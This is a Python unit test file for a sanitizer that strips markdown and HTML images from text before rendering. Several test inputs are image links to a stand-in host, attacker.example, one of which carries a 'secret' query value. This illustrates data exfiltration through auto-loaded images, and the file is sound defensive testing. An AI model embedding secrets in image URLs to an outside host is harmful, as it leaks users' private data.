import pytest

from frontend.rendering import without_images

pytestmark = pytest.mark.unit


@pytest.mark.parametrize(
    ("text", "safe"),
    [
        ("Answer ![s](https://attacker.example/p?q=secret)", "Answer \\[image removed: s\\]"),
        ("![](https://attacker.example/p)", "\\[image removed\\]"),
        (
            "![logo][ref]\n\n[ref]: https://attacker.example/p",
            "\\[image removed: logo\\]\n\n[ref]: https://attacker.example/p",
        ),
        (
            "[![badge](https://x.example/b.svg)](https://x.example)",
            "[\\[image removed: badge\\]](https://x.example)",
        ),
        ("<img src=https://attacker.example/p>", "\\[image removed\\]"),
        (
            "A [link](https://example.com) and **bold**",
            "A [link](https://example.com) and **bold**",
        ),
    ],
)
def test_images_never_reach_the_renderer(text: str, safe: str) -> None:
    assert without_images(text) == safe
